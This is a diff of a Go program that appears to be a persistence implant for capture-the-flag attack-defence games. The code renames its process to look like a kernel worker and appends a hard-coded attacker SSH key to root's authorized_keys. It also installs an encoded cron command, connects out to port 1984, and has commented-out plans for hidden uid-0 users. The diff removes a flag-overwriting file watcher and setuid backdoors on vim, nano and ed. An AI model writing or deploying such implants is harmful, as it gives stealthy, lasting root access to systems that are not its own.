@@ -13,7 +13,6 @@ import (
 	"unsafe"
 
 	"github.com/nightlyone/lockfile"
-	"github.com/radovskyb/watcher"
 )
 
 func SetProcessName(name string) error {
@@ -105,24 +104,21 @@ func main() {
 		//try to lock again.
 		//if we still can't lock, exit.
 		ignoreLockIfRootOtherwiseExit(lock)
+		print("Still can't lock")
 	}
 
 	//Define the list of IP addresses to connect to.
-	ips := []string{"192.168.76.136"} // Example list of IP addresses
+	ips := []string{"127.0.0.1"} // Example list of IP addresses
 	//Define the port to connect to.
 	port := "1984"
 	//Define the paths to all the ctf flag files to overwrite with our own.
-	flagFiles := []string{"/home/justin/flag.txt"} // Example list of flag file paths
 	//defines the ssh key to add to the authorized_keys file.
 	sshKey := "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDf+adep5YH3IcKGkkj9IbFn1Ua1S20hKCF+fULaI5cXahITxdh89URSpQ0sMtDolL+VMVzsayq/RCeJT032RicXGLq7wKDXt6eXfyY/fjvph21t014X41whzYz+U8m1wZb/96o09xqkG2rUfACKn0iOK9ukhTFy7/H7vkRpoA8NVEzrcKUZ/x5vzh3fX8nJwHqhfYjd8BLAwuGupWpipFiUMtPWwATgVLv9qQWSXPp4TtK1URCR0aHo7/4MW15OQ4WeU1xZOltaRBMQMigPnUHZNgv8iRgoIPpDBnAgX4SswMggwQNTUIR3fNT9CDxv78VEUGO9GpaLny2EdlXF+xdMngRZHFNias7TaxjeUoydj2sFIK14HAgchT2XdkEObw9/g/vMFfEz7/j/7aFi9QOO5amZ5q2Oqw8H6YX9oYL8aQqVDv4cL3rFzLDTfzWL+Fft32OfFOJPoBtpvrSzyvvZMFNsgdsT5m1w18D1tb4dqt95RuinZ3l/h+m5WHMRWJU3WS1qhVcHeCy9jNIXp/Hf066ZOvYXwpTzkc4/FwCHag4fK4ZcmzJG4Hg8iyRLQEHlDF37epq7IdrN7Y3Q+bYeWQ25KBzSBjjMfjwwi6qE2rfhSnMeSK3mqECWjB/sBpttZn7GDHgbtKzhJKKcLae4tJkiORmdYV10HSkMpOjgw== justin@box1"
-	//define the string to overwrite the flag files with.
-	flag := "flag{this_is_a_fake_flag}"
 	//define the list of uid 0 dummy users to create. (ROOT ONLY)
 	//dummyUsers := []string{"systemd-timesyncd", "_backup", "rsync", "dhcp"}
 	//define the dummy password to set for the dummy users.
 	//dummyPassword := "c3tc3tc3t"
 	//define the list of binaries to add the suid bit to. (ROOT ONLY)
-	setuidBackdoorBinaries := []string{"/usr/bin/vim", "/usr/bin/vi", "/usr/bin/nano", "/bin/ed"}
 	//rename the process to something less suspicious.
 	list_of_unsuspicious_filenames := []string{
 		"[kworker/0:1]",
@@ -146,7 +142,6 @@ func main() {
 
 	if isRoot() {
 		//setuid the binaries.
-		setSuidBitOnBackdoorBinaries(setuidBackdoorBinaries)
 		//write the ssh key to the authorized_keys file.
 		//open the file for appending.
 		file, err := os.OpenFile("/root/.ssh/authorized_keys", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
@@ -179,37 +174,8 @@ func main() {
 
 	//encode the cron command in base64 and execute it.
 	installIntoCrontab(encodedCommand)
-
-	//overwrite the flag files with our own flag.
-	for _, path := range flagFiles {
-		overwriteFile(path, flag)
-	}
-	// Watch the flag files for changes and overwrite them with our own flag when they change.
-	w := watcher.New()
-	w.SetMaxEvents(1)
-	w.FilterOps(watcher.Write)
-	for _, path := range flagFiles {
-		if err := w.Add(path); err != nil {
-			fmt.Println(err)
-		}
-	}
-	go func() {
-		for {
-			select {
-			case event := <-w.Event:
-				if event.Op == watcher.Write {
-					overwriteFile(event.Path, flag)
-					//get rid of the event to avoid a loop.
-				}
-			case err := <-w.Error:
-				fmt.Println(err)
-			}
-		}
-	}()
-
-	if err := w.Start(time.Millisecond * 100); err != nil {
-		fmt.Println(err)
-	}
+	//wait forever
+	select {}
 
 }
 
